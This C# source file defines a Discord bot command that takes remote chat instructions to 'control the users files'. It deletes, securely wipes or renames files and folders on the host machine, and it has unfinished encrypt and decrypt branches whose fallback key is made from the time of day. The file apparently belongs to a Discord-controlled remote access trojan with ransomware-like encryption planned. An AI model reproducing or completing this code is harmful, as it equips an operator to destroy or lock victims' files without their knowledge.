using Discord;
using Discord.Commands;

namespace Main.Source.Bot.Commands
{
    public class Files : CommandBase
    {
        public override string Name => "file";
        public override string Info => "Control the users files";
        public override string Use => "Path (wrap in double quotes) + [-delete | -securedelete | -rename (New name?) | -encrypt (Key?) | -decrypt (Key?)]";

        public override async Task Func(SocketCommandContext socket, string[] args)
        {
            if (args.Length < 1)
            {
                await socket.Message.ReplyAsync("Usage: " + Use);
                return;
            }

            string arguments = string.Join(" ", args);

            string path = Utilities.Parser.FromQuotes(arguments);
            if (!Path.Exists(path))
            {
                await socket.Message.ReplyAsync($"Path `{path}` does not exist");
                return;
            }

            if (Utilities.Parser.GetFlag(arguments, "delete"))
            {
                if (Directory.Exists(path))
                {
                    Directory.Delete(path, true);

                    await socket.Message.ReplyAsync("Deleted directory");
                }
                else
                {
                    File.Delete(path);

                    await socket.Message.ReplyAsync("Deleted file");
                }
            }
            else if (Utilities.Parser.GetFlag(arguments, "securedelete"))
            {
                if (Directory.Exists(path))
                {
                    string[] allFiles = Directory.GetFiles(path);
                    foreach (string file in allFiles)
                    {
                        Utilities.Files.SecureDelete(file);
                    }

                    Directory.Delete(path, true);

                    await socket.Message.ReplyAsync("Deleted directory");
                }
                else
                {
                    Utilities.Files.SecureDelete(path);

                    await socket.Message.ReplyAsync("Deleted file");
                }
            }
            else if (Utilities.Parser.GetFlag(arguments, "rename"))
            {
                string newName = arguments
                    .Replace($"\"{path}\"", "")
                    .Replace("-rename", "")
                    .Trim();

                if (Directory.Exists(path))
                {
                    int counter = 1;

                    string[] allFiles = Directory.GetFiles(path);
                    foreach (string file in allFiles)
                    {
                        string newPath = Path.Join(
                            Path.GetDirectoryName(file),
                            $"{newName} {counter}{Path.GetExtension(file)}"
                        );

                        File.Move(file, newPath, true);

                        counter++;
                    }

                    await socket.Message.ReplyAsync($"Renamed `{counter}` {(counter == 1 ? "file" : "files")}");
                }
                else
                {
                    string newPath = Path.Join(
                        Path.GetDirectoryName(path),
                        $"{newName}{Path.GetExtension(path)}"
                    );

                    File.Move(path, newPath, true);

                    await socket.Message.ReplyAsync($"Renamed 1 file");
                }
            }
            else if (Utilities.Parser.GetFlag(arguments, "encrypt"))
            {
                string key = arguments
                    .Replace($"\"{path}\"", "")
                    .Replace("-encrypt", "")
                    .Trim();

                if (string.IsNullOrEmpty(key))
                {
                    key = DateTime.Now.ToString("HH:mm:ss").Replace(":", "");
                    await socket.Message.ReplyAsync($"Key is \"{key}\"");
                }

                if (Directory.Exists(path))
                {
                    
                }
                else
                {

                }
            }
            else if (Utilities.Parser.GetFlag(arguments, "decrypt"))
            {
                string key = arguments
                    .Replace($"\"{path}\"", "")
                    .Replace("-decrypt", "")
                    .Trim();


            }
            else
            {
                await socket.Message.ReplyAsync("Usage: " + Use);
            }
        }
    }
}
